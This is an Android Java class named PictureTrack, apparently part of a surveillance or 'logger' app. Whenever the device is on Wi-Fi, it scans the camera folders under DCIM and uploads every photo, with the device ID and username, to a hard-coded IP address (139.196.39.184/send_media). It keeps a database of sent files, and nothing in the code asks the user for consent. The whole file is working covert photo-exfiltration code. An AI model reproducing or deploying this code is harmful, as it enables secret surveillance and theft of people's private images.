package com.os.logger.track;

import android.content.Context;
import android.os.Environment;
import android.text.TextUtils;

import com.monitor.greendao.MediaEntity;
import com.monitor.greendao.MediaEntityDao;
import com.os.logger.DBHelper;
import com.os.logger.LogUtil;
import com.os.logger.PreferenceUtil;
import com.os.logger.TelephonyHelper;
import com.os.logger.UploadHelper;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * Created by Alan on 16/5/12.
 */
public class PictureTrack extends BaseTrack {
    private static String sUrl = "http://139.196.39.184/send_media";
    private List<MediaEntity> mSentEntries;
    //    private Task mTask;
    private ArrayList<File> mTasks;

    public PictureTrack(Context context) {
        super(context);
    }

    private void scanFiles(File path, boolean check) {
        if (path.isDirectory()) {
            if (!check || legalDir(path)) {
                File[] files = path.listFiles();
                for (File file : files) {
                    scanFiles(file, true);
                }

            }
        } else {
            addTask(path);
        }
    }

    private boolean legalDir(File file) {
        return "Camera".equalsIgnoreCase(file.getName());
    }

    private void addTask(File file) {
        if (sent(file)) {
            return;
        }

        if (!legal(file)) {
            return;
        }
        if (mTasks == null) {
            mTasks = new ArrayList<>();
        }

        mTasks.add(file);

//        HashMap<String,String> args = new HashMap<>();
//        String userName = PreferenceUtil.getString(getContext(),PreferenceUtil.KEY_USER_NAME);
//        if (!TextUtils.isEmpty(userName)){
//            args.put("username",userName);
//        }
//        args.put("deviceid", TelephonyHelper.getDeviceId(getContext()));
//        args.put("time",String.valueOf(file.lastModified()));
//        UploadHelper.getInstance().uploadForm(sUrl, file, args, new Callback() {
//            @Override
//            public void onFailure(Call call, IOException e) {
//
//            }
//
//            @Override
//            public void onResponse(Call call, Response response) throws IOException {
//                if (isSuccessFul(response)){
//                    markSent(file);
//                }
//            }
//        });
    }

    private void report(final File file) {
        if (sent(file)) {
            return;
        }

        if (!inWifi()) {
            return;
        }

        LogUtil.e(file.getName());

        HashMap<String, String> args = new HashMap<>();
        String userName = PreferenceUtil.getString(getContext(), PreferenceUtil.KEY_USER_NAME);
        if (!TextUtils.isEmpty(userName)) {
            args.put("username", userName);
        }
        args.put("deviceid", TelephonyHelper.getDeviceId(getContext()));
        args.put("time", String.valueOf(file.lastModified()));
        UploadHelper.getInstance().uploadForm(sUrl, file, args, new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                UploadHelper.getInstance().removeFormCall(call);
                moveToNext();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (isSuccessFul(response)) {
                    markSent(file);
                }
                UploadHelper.getInstance().removeFormCall(call);
                moveToNext();
            }
        });
    }

    private boolean legal(File file) {
        if (file == null) {
            return false;
        }
        if (!file.exists()) {
            return false;
        }
        String name = file.getName();
        return !name.startsWith(".");
    }

    private boolean isSuccessFul(Response response) {
        if (!response.isSuccessful()) {
            response.body().close();
            return false;
        }
        String body = null;
        try {
            body = response.body().string();
            LogUtil.e("media:" + body);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return body != null && !body.contains("errorno");
    }

    private boolean sent(File file) {
        if (mSentEntries == null) {
            return false;
        }
        String name = file.getName();
        long time = file.lastModified();
        for (MediaEntity entity : mSentEntries) {
            if (time == entity.getModifyTime() && TextUtils.equals(name, entity.getName())) {
                return true;
            }

        }
        return false;
    }

    private void markSent(File file) {
        if (mSentEntries == null) {
            mSentEntries = new ArrayList<>();
        }
        MediaEntity entity = new MediaEntity(file.lastModified(), file.getName());
        mSentEntries.add(entity);
        MediaEntityDao dao = DBHelper.getInstance().getDaoSession().getMediaEntityDao();
        dao.insertOrReplace(entity);
    }

    @Override
    public void sync() {
        if (!inWifi()) {
            return;
        }
        File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (!dir.exists()) {
            return;
        }
        //reset
        if (mTasks != null) {
            mTasks.clear();
        }
        scanFiles(dir, false);

        moveToNext();
    }

    private void moveToNext() {
        if (mTasks == null || mTasks.size() == 0) {
            return;
        }

        Random random = new Random();
        int index = random.nextInt(mTasks.size());
        File file = mTasks.remove(index);
        report(file);
    }

    @Override
    public void destroy() {
        if (mTasks != null) {
            mTasks.clear();
        }
    }

    @Override
    public void ready() {
        MediaEntityDao dao = DBHelper.getInstance().getDaoSession().getMediaEntityDao();
        mSentEntries = dao.queryBuilder().list();

//        if (!inWifi()){
//            return;
//        }
//        File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
//        if (!dir.exists()){
//            return;
//        }
//        scanFiles(dir);
    }
}
